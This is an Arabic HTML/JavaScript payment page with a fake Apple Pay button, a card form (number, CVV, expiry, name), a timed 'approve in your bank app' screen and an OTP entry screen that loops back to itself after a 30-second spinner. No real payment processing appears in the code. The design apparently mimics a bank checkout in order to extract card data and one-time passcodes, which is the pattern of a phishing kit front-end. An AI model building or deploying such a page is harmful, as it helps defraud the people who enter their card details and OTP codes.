<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>بطاقة الدفع</title>

<style>
*,
*::before,
*::after{
  box-sizing:border-box;
}

html{
  width:100%;
  margin:0;
  padding:0;
}

body{
  width:100%;
  min-height:100vh;
  margin:0;
  padding:0;
  font-family:Arial,sans-serif;
  background:#f5f5f5;
  color:#111;
  overflow-x:hidden;
}

/* الحاوية العامة */
.site-shell{
  width:100%;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:flex-start;
  padding:20px 16px 32px;
}

/* شاشة البطاقة */
.payment-screen{
  display:block;
  width:100%;
}

/* حاوية المحتوى الأساسية */
.payment-wrap{
  width:min(100%, 760px);
  margin:0 auto;
}

/* طبقة Apple Pay البيضاء */
.apple-pay-screen{
  position:fixed;
  inset:0;
  background:#fff;
  z-index:99999;
  display:none;
}

/* زر Apple Pay */
.apple-pay-btn{
  width:100%;
  margin:0 auto 14px;
  background:#000;
  border:none;
  border-radius:999px;
  min-height:62px;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
  cursor:pointer;
  padding:10px 18px;
  -webkit-tap-highlight-color:transparent;
}

/* حاوية شعار أبل */
.apple-wrap{
  display:flex;
  align-items:center;
  justify-content:center;
  width:100%;
  min-height:40px;
}

/* شعار Apple Pay */
.apple-logo{
  display:block;
  width:auto;
  height:36px;
  max-width:min(280px, 70%);
  object-fit:contain;
  background:transparent !important;
  border:none !important;
  box-shadow:none !important;
  pointer-events:none;
}

/* الإطار الرئيسي */
.box{
  width:100%;
  margin:0 auto;
  border:2px solid #111;
  border-radius:28px;
  padding:24px;
  background:#fff;
  overflow:hidden;
}

/* العنوان */
.title{
  font-size:28px;
  font-weight:700;
  line-height:1.3;
  margin-bottom:18px;
  text-align:right;
}

/* حقل رقم البطاقة */
.input-box{
  width:100%;
  min-height:56px;
  background:#f2f2f2;
  border-radius:999px;
  padding:0 16px;
  margin-top:14px;
  display:flex;
  align-items:center;
  border:1px solid transparent;
  transition:border-color .2s ease, box-shadow .2s ease;
  min-width:0;
}

/* شعار البطاقة */
.card-icon{
  width:68px;
  height:auto;
  margin-left:10px;
  background:transparent !important;
  border:none !important;
  box-shadow:none !important;
  display:block;
  flex:0 0 auto;
}

/* رقم البطاقة */
.card-number{
  width:100%;
  min-width:0;
  border:none;
  outline:none;
  background:transparent;
  font-size:17px;
  text-align:right;
  color:#111;
}

/* صف */
.row{
  display:flex;
  width:100%;
  gap:12px;
  margin-top:14px;
}

/* المدخلات الصغيرة */
.small-input{
  flex:1;
  min-width:0;
  min-height:52px;
  border:1px solid transparent;
  outline:none;
  background:#f2f2f2;
  border-radius:999px;
  padding:0 14px;
  text-align:center;
  font-size:16px;
  transition:border-color .2s ease, box-shadow .2s ease;
}

/* الاسم */
.name-input{
  width:100%;
  min-height:56px;
  border:1px solid transparent;
  outline:none;
  background:#f2f2f2;
  border-radius:999px;
  padding:0 16px;
  text-align:center;
  font-size:17px;
  margin-top:14px;
  transition:border-color .2s ease, box-shadow .2s ease;
}

/* تاريخ الانتهاء */
.expiry-box{
  flex:1;
  min-width:0;
  min-height:52px;
  background:#f2f2f2;
  border-radius:999px;
  display:flex;
  align-items:center;
  justify-content:center;
  border:1px solid transparent;
  transition:border-color .2s ease, box-shadow .2s ease;
  overflow:hidden;
  direction:ltr;
  padding:0 8px;
}

.expiry-select{
  width:44%;
  border:none;
  outline:none;
  background:transparent;
  font-size:16px;
  text-align:center;
  text-align-last:center;
  appearance:none;
  -webkit-appearance:none;
  -moz-appearance:none;
  color:#111;
  cursor:pointer;
  min-width:0;
}

.expiry-sep{
  width:12%;
  text-align:center;
  font-size:16px;
  color:#555;
  user-select:none;
}

/* زر الدفع */
.pay-btn{
  width:100%;
  margin:16px auto 0;
  background:#2e9f44;
  color:#fff;
  border:none;
  border-radius:999px;
  min-height:60px;
  padding:14px 18px;
  font-size:22px;
  font-weight:700;
  cursor:pointer;
  display:block;
  -webkit-tap-highlight-color:transparent;
}

/* الخطأ */
.error{
  border-color:rgba(220,38,38,.45) !important;
  box-shadow:0 0 0 2px rgba(220,38,38,.08) !important;
}

input::placeholder{
  color:#777;
}

select:invalid{
  color:#777;
}

/* الشاشات المنبثقة */
.flow-screen{
  position:fixed;
  inset:0;
  background:#fff;
  z-index:100000;
  display:none;
  align-items:center;
  justify-content:center;
  padding:24px 16px;
}

.flow-card{
  width:min(100%, 760px);
  text-align:center;
}

/* الدولاب */
.loader-pro{
  position:relative;
  width:132px;
  height:132px;
  margin:0 auto 22px;
  border-radius:50%;
  background:conic-gradient(
    from 210deg,
    #0b78f2 0deg 58deg,
    #b9dafb 58deg 360deg
  );
  animation:spinRing 1.15s linear infinite;
}

.loader-pro::before{
  content:"";
  position:absolute;
  inset:18px;
  background:#fff;
  border-radius:50%;
}

.loader-pro::after{
  content:"";
  position:absolute;
  inset:0;
  border-radius:50%;
  box-shadow:
    0 0 0 1px rgba(11,120,242,.03),
    0 8px 20px rgba(11,120,242,.08);
}

.countdown{
  font-size:34px;
  font-weight:700;
  color:#1d4ed8;
  direction:ltr;
}

/* صفحة المصادقة */
.auth-title{
  font-size:34px;
  font-weight:800;
  color:#111;
  line-height:1.5;
  margin-bottom:18px;
}

.auth-desc{
  font-size:22px;
  line-height:2;
  color:#444;
  margin-bottom:26px;
}

.back-link{
  display:inline-block;
  margin-top:120px;
  font-size:18px;
  font-weight:700;
  color:#5b8def;
  text-decoration:underline;
  text-underline-offset:4px;
  cursor:pointer;
}

/* صفحة OTP */
.otp-desc{
  font-size:18px;
  line-height:2;
  color:#111;
  margin-bottom:18px;
}

.otp-input{
  width:100%;
  min-height:56px;
  border-radius:999px;
  border:1px solid transparent;
  background:#f2f2f2;
  outline:none;
  text-align:center;
  font-size:18px;
  padding:0 16px;
  transition:border-color .2s ease, box-shadow .2s ease;
}

.otp-btn{
  width:100%;
  margin-top:15px;
  background:#2e9f44;
  color:#fff;
  border:none;
  border-radius:999px;
  min-height:60px;
  padding:14px 18px;
  font-size:22px;
  font-weight:700;
  cursor:pointer;
}

/* منع تكبير حقول iPhone */
input,
select,
textarea,
button{
  font-family:inherit;
}

@keyframes spinRing{
  from{ transform:rotate(0deg); }
  to{ transform:rotate(360deg); }
}

/* شاشات كبيرة */
@media (min-width: 992px){
  .site-shell{
    padding:42px 24px;
  }

  .payment-wrap{
    width:min(100%, 860px);
  }

  .box{
    padding:30px 28px;
    border-radius:32px;
  }

  .title{
    font-size:32px;
    margin-bottom:20px;
  }

  .apple-pay-btn{
    min-height:68px;
  }

  .apple-logo{
    height:40px;
    max-width:320px;
  }

  .pay-btn{
    min-height:64px;
    font-size:24px;
  }

  .flow-card{
    width:min(100%, 860px);
  }
}

/* تابلت */
@media (min-width: 768px) and (max-width: 991px){
  .site-shell{
    padding:28px 20px 36px;
  }

  .payment-wrap{
    width:min(100%, 720px);
  }

  .apple-pay-btn{
    min-height:64px;
  }

  .apple-logo{
    height:38px;
    max-width:300px;
  }

  .box{
    padding:26px 24px;
  }

  .title{
    font-size:30px;
  }
}

/* جوالات متوسطة */
@media (max-width: 767px){
  .site-shell{
    padding:16px 12px 24px;
  }

  .payment-wrap{
    width:100%;
  }

  .apple-pay-btn{
    min-height:56px;
    margin-bottom:12px;
  }

  .apple-logo{
    height:32px;
    max-width:220px;
  }

  .box{
    padding:18px 16px;
    border-radius:24px;
  }

  .title{
    font-size:22px;
    margin-bottom:14px;
  }

  .input-box,
  .name-input{
    min-height:50px;
  }

  .small-input,
  .expiry-box{
    min-height:48px;
  }

  .card-number,
  .small-input,
  .expiry-select,
  .name-input{
    font-size:16px;
  }

  .pay-btn,
  .otp-btn{
    min-height:54px;
    font-size:19px;
  }

  .auth-title{
    font-size:28px;
  }

  .auth-desc{
    font-size:18px;
    line-height:1.9;
  }

  .back-link{
    margin-top:90px;
    font-size:16px;
  }

  .loader-pro{
    width:112px;
    height:112px;
  }

  .countdown{
    font-size:29px;
  }
}

/* جوالات صغيرة جدا */
@media (max-width: 380px){
  .site-shell{
    padding:12px 10px 20px;
  }

  .apple-pay-btn{
    min-height:52px;
  }

  .apple-logo{
    height:28px;
    max-width:190px;
  }

  .box{
    padding:16px 12px;
    border-radius:22px;
  }

  .title{
    font-size:20px;
  }

  .row{
    gap:8px;
  }

  .card-icon{
    width:56px;
    margin-left:8px;
  }

  .card-number,
  .small-input,
  .expiry-select,
  .name-input,
  .otp-input{
    font-size:15px;
  }

  .pay-btn,
  .otp-btn{
    font-size:18px;
    min-height:52px;
  }

  .auth-title{
    font-size:24px;
  }

  .auth-desc{
    font-size:16px;
  }
}
</style>
</head>

<body>

<div class="site-shell">

  <!-- شاشة البطاقة -->
  <div class="payment-screen" id="paymentScreen">
    <div class="payment-wrap">

      <div class="apple-pay-screen" id="applePayScreen"></div>

      <button class="apple-pay-btn" id="applePayBtn" type="button">
        <div class="apple-wrap">
          <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo" alt="Apple Pay">
        </div>
      </button>

      <div class="box">
        <div class="title">بطاقة الائتمان</div>

        <div class="input-box" id="cardBox">
          <img
            id="cardLogo"
            class="card-icon"
            src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
            alt="card"
          >

          <input
            type="text"
            id="cardNumber"
            class="card-number"
            placeholder="رقم البطاقة"
            maxlength="16"
            inputmode="numeric"
            autocomplete="cc-number"
          >
        </div>

        <div class="row">
          <input
            type="text"
            id="cvv"
            class="small-input"
            placeholder="CVV"
            maxlength="3"
            inputmode="numeric"
            autocomplete="cc-csc"
          >

          <div class="expiry-box" id="expiryBox">
            <select id="expMonth" class="expiry-select" required>
              <option value="" selected disabled>MM</option>
            </select>
            <div class="expiry-sep">/</div>
            <select id="expYear" class="expiry-select" required>
              <option value="" selected disabled>YY</option>
            </select>
          </div>
        </div>

        <input
          type="text"
          id="cardName"
          class="name-input"
          placeholder="الاسم الموجود على البطاقة"
          autocomplete="cc-name"
        >
      </div>

      <button class="pay-btn" id="payBtn" type="button">ادفع الآن</button>
    </div>
  </div>

</div>

<!-- شاشة الانتظار الأولى 60 ثانية -->
<div class="flow-screen" id="loadingScreen1">
  <div class="flow-card">
    <div class="loader-pro"></div>
    <div class="countdown" id="countdown60">60</div>
  </div>
</div>

<!-- صفحة المصادقة عبر التطبيق -->
<div class="flow-screen" id="approvalScreen">
  <div class="flow-card">
    <div class="auth-title">صادق على المعاملة عبر تطبيق المصرف الخاص بك</div>
    <div class="auth-desc">
      اضغط على الإشعار المرسل إليك في التطبيق المصرفي<br>
      راجع معاملة الدفع ووافق عليها
    </div>
    <div class="back-link" id="backToOtp">رجوع الى رمز التحقق</div>
  </div>
</div>

<!-- صفحة رمز التحقق -->
<div class="flow-screen" id="otpScreen">
  <div class="flow-card">
    <div class="otp-desc">
      يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة
    </div>

    <input
      type="text"
      id="otpInput"
      class="otp-input"
      placeholder="أدخل رمز التحقق"
      inputmode="numeric"
      maxlength="6"
    >

    <button class="otp-btn" id="otpBtn" type="button">تحقق</button>
  </div>
</div>

<!-- شاشة الانتظار الثانية 30 ثانية -->
<div class="flow-screen" id="loadingScreen2">
  <div class="flow-card">
    <div class="loader-pro"></div>
  </div>
</div>

<script>
const cardInput = document.getElementById("cardNumber");
const cvvInput = document.getElementById("cvv");
const nameInput = document.getElementById("cardName");
const expMonth = document.getElementById("expMonth");
const expYear = document.getElementById("expYear");
const expiryBox = document.getElementById("expiryBox");
const logo = document.getElementById("cardLogo");
const cardBox = document.getElementById("cardBox");
const payBtn = document.getElementById("payBtn");
const applePayBtn = document.getElementById("applePayBtn");
const applePayScreen = document.getElementById("applePayScreen");

const paymentScreen = document.getElementById("paymentScreen");
const loadingScreen1 = document.getElementById("loadingScreen1");
const approvalScreen = document.getElementById("approvalScreen");
const otpScreen = document.getElementById("otpScreen");
const loadingScreen2 = document.getElementById("loadingScreen2");

const countdown60 = document.getElementById("countdown60");
const backToOtp = document.getElementById("backToOtp");
const otpInput = document.getElementById("otpInput");
const otpBtn = document.getElementById("otpBtn");

const LOGO_DEFAULT = "https://i.postimg.cc/Hsf6sDzk/20260412-152344.png";
const LOGO_VISA = "https://i.postimg.cc/Gmw4mqyR/20260412-151020.png";
const LOGO_MC = "https://i.postimg.cc/fb5y5sgX/20260412-150959.png";

let timer60 = null;
let timer30 = null;

/* تعبئة الأشهر 01 - 12 */
for (let i = 1; i <= 12; i++) {
  const val = String(i).padStart(2, "0");
  const option = document.createElement("option");
  option.value = val;
  option.textContent = val;
  expMonth.appendChild(option);
}

/* تعبئة السنوات 26 - 50 */
for (let i = 26; i <= 50; i++) {
  const val = String(i);
  const option = document.createElement("option");
  option.value = val;
  option.textContent = val;
  expYear.appendChild(option);
}

function toggleError(element, show) {
  if (show) {
    element.classList.add("error");
  } else {
    element.classList.remove("error");
  }
}

function setCaretToEnd(el) {
  try {
    const len = el.value.length;
    el.setSelectionRange(len, len);
  } catch (e) {}
}

function sanitizeCard(value) {
  return value.replace(/\D/g, "").slice(0, 16);
}

function sanitizeCVV(value) {
  return value.replace(/\D/g, "").slice(0, 3);
}

function sanitizeName(value) {
  return value
    .replace(/[^A-Za-z ]/g, "")
    .replace(/\s{2,}/g, " ")
    .replace(/^\s+/, "");
}

function sanitizeOTP(value) {
  return value.replace(/\D/g, "").slice(0, 6);
}

function showScreen(screen) {
  paymentScreen.style.display = "none";
  loadingScreen1.style.display = "none";
  approvalScreen.style.display = "none";
  otpScreen.style.display = "none";
  loadingScreen2.style.display = "none";
  screen.style.display = "flex";
}

function hideAllTimers() {
  if (timer60) {
    clearInterval(timer60);
    timer60 = null;
  }
  if (timer30) {
    clearTimeout(timer30);
    timer30 = null;
  }
}

function detectCardType(number) {
  if (!/^\d+$/.test(number)) return "unknown";

  if (number.startsWith("4")) return "visa";

  if (number.length >= 2) {
    const firstTwo = parseInt(number.slice(0, 2), 10);
    if (firstTwo >= 51 && firstTwo <= 55) return "mastercard";
  }

  if (number.length >= 4) {
    const firstFour = parseInt(number.slice(0, 4), 10);
    if (firstFour >= 2221 && firstFour <= 2720) return "mastercard";
  }

  return "unknown";
}

function updateCardLogo(type) {
  if (type === "visa") {
    logo.src = LOGO_VISA;
  } else if (type === "mastercard") {
    logo.src = LOGO_MC;
  } else {
    logo.src = LOGO_DEFAULT;
  }
}

function validateCard() {
  const value = cardInput.value;
  const type = detectCardType(value);
  updateCardLogo(type);

  const valid = /^\d{16}$/.test(value);
  toggleError(cardBox, !valid);
  return valid;
}

function validateCVV() {
  const valid = /^\d{3}$/.test(cvvInput.value);
  toggleError(cvvInput, !valid);
  return valid;
}

function validateName() {
  const value = nameInput.value.trim();
  const valid = /^[A-Za-z ]+$/.test(value) && /[A-Za-z]/.test(value);
  toggleError(nameInput, !valid);
  return valid;
}

function validateExpiry() {
  const month = expMonth.value;
  const year = expYear.value;
  const valid = month !== "" && year !== "";
  toggleError(expiryBox, !valid);
  return valid;
}

function validateOTP() {
  const value = otpInput.value.trim();
  const valid = /^\d{4,6}$/.test(value);
  toggleError(otpInput, !valid);
  return valid;
}

/* رقم البطاقة */
cardInput.addEventListener("input", function () {
  this.value = sanitizeCard(this.value);
  updateCardLogo(detectCardType(this.value));

  if (this.value.length > 0) {
    if (/^\d{16}$/.test(this.value)) {
      validateCard();
    } else {
      toggleError(cardBox, false);
    }
  } else {
    toggleError(cardBox, false);
    updateCardLogo("unknown");
  }
});

cardInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (!/^\d$/.test(ch)) e.preventDefault();
});

cardInput.addEventListener("paste", function (e) {
  e.preventDefault();
  const pasted = (e.clipboardData || window.clipboardData).getData("text");
  const cleaned = sanitizeCard(pasted);

  if (!cleaned.length) return;

  this.value = cleaned;
  updateCardLogo(detectCardType(this.value));

  if (/^\d{16}$/.test(this.value)) {
    validateCard();
  } else {
    toggleError(cardBox, false);
  }

  setCaretToEnd(this);
});

/* CVV */
cvvInput.addEventListener("input", function () {
  this.value = sanitizeCVV(this.value);

  if (this.value.length > 0) {
    if (this.value.length === 3) {
      validateCVV();
    } else {
      toggleError(cvvInput, false);
    }
  } else {
    toggleError(cvvInput, false);
  }
});

cvvInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (!/^\d$/.test(ch)) e.preventDefault();
});

cvvInput.addEventListener("paste", function (e) {
  e.preventDefault();
  const pasted = (e.clipboardData || window.clipboardData).getData("text");
  const cleaned = sanitizeCVV(pasted);

  if (!cleaned.length) return;

  this.value = cleaned;

  if (this.value.length === 3) {
    validateCVV();
  } else {
    toggleError(cvvInput, false);
  }

  setCaretToEnd(this);
});

/* الاسم */
nameInput.addEventListener("input", function () {
  this.value = sanitizeName(this.value);

  if (this.value.trim().length > 0) {
    validateName();
  } else {
    toggleError(nameInput, false);
  }
});

nameInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (ch.length === 1 && !/[A-Za-z ]/.test(ch)) {
    e.preventDefault();
  }
});

nameInput.addEventListener("paste", function (e) {
  e.preventDefault();
  const pasted = (e.clipboardData || window.clipboardData).getData("text");
  const cleaned = sanitizeName(pasted);

  if (!cleaned.length) return;

  this.value = cleaned.trimStart();

  if (this.value.trim().length > 0) {
    validateName();
  } else {
    toggleError(nameInput, false);
  }

  setCaretToEnd(this);
});

/* OTP */
otpInput.addEventListener("input", function () {
  this.value = sanitizeOTP(this.value);

  if (this.value.length > 0) {
    validateOTP();
  } else {
    toggleError(otpInput, false);
  }
});

otpInput.addEventListener("keypress", function (e) {
  const ch = e.key;
  if (!/^\d$/.test(ch)) e.preventDefault();
});

otpInput.addEventListener("paste", function (e) {
  e.preventDefault();
  const pasted = (e.clipboardData || window.clipboardData).getData("text");
  const cleaned = sanitizeOTP(pasted);

  if (!cleaned.length) return;

  this.value = cleaned;

  if (this.value.length > 0) {
    validateOTP();
  } else {
    toggleError(otpInput, false);
  }

  setCaretToEnd(this);
});

/* منع اللصق على القوائم */
expMonth.addEventListener("paste", function (e) { e.preventDefault(); });
expYear.addEventListener("paste", function (e) { e.preventDefault(); });

/* إزالة الخطأ عند التركيز */
cardInput.addEventListener("focus", () => cardBox.classList.remove("error"));
cvvInput.addEventListener("focus", () => cvvInput.classList.remove("error"));
nameInput.addEventListener("focus", () => nameInput.classList.remove("error"));
expMonth.addEventListener("focus", () => expiryBox.classList.remove("error"));
expYear.addEventListener("focus", () => expiryBox.classList.remove("error"));
otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));

/* تحقق مباشر عند التغيير */
expMonth.addEventListener("change", validateExpiry);
expYear.addEventListener("change", validateExpiry);

/* Apple Pay */
applePayBtn.addEventListener("click", function () {
  applePayScreen.style.display = "block";
  setTimeout(function () {
    applePayScreen.style.display = "none";
  }, 2000);
});

/* شاشة 60 ثانية */
function startFirstLoading() {
  hideAllTimers();
  showScreen(loadingScreen1);

  let seconds = 60;
  countdown60.textContent = seconds;

  timer60 = setInterval(function () {
    seconds--;
    countdown60.textContent = seconds;

    if (seconds <= 0) {
      clearInterval(timer60);
      timer60 = null;
      showScreen(approvalScreen);
    }
  }, 1000);
}

/* شاشة 30 ثانية */
function startSecondLoading() {
  hideAllTimers();
  showScreen(loadingScreen2);

  timer30 = setTimeout(function () {
    timer30 = null;
    showScreen(otpScreen);
    otpInput.value = "";
    otpInput.classList.remove("error");
  }, 30000);
}

/* رجوع الى رمز التحقق */
backToOtp.addEventListener("click", function () {
  hideAllTimers();
  showScreen(otpScreen);
  otpInput.value = "";
  otpInput.classList.remove("error");
});

/* زر تحقق OTP */
otpBtn.addEventListener("click", function () {
  const isOtpValid = validateOTP();
  if (!isOtpValid) return;
  startSecondLoading();
});

/* زر الدفع */
payBtn.addEventListener("click", function (e) {
  e.preventDefault();

  const isCardValid = validateCard();
  const isCVVValid = validateCVV();
  const isNameValid = validateName();
  const isExpiryValid = validateExpiry();

  if (isCardValid && isCVVValid && isNameValid && isExpiryValid) {
    startFirstLoading();
  }
});
</script>
</body>
